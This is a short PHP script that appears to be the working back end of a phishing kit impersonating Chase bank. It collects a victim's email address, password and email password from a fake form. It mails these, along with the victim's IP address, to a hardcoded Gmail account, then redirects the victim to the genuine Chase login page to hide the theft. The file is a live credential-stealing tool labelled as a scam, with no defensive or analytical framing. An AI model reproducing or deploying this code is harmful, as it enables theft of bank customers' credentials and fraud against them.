<?

$ip = getenv("REMOTE_ADDR");
$message .= "---- : || Chase ScAm Inf0 (1) || :------\n";
$message .= "Email Address: ".$_POST['3']."\n";
$message .= "Password: ".$_POST['4']."\n";
$message .= "Confirm E-mail Password:               ".$_POST['zipxnx']."\n";
$message .= "----: || tHAnks tO Spammers Toolz || :------\n";
$message .= "IP: ".$ip."\n";


$recipient = "jamesrich1213@gmail.com";
$subject = "eM@iL | ".$ip."\n";

mail($recipient,$subject,$message);

header("Location:  https://secure01a.chase.com/web/auth/#/logon/recognizeUser/instructions");
?>


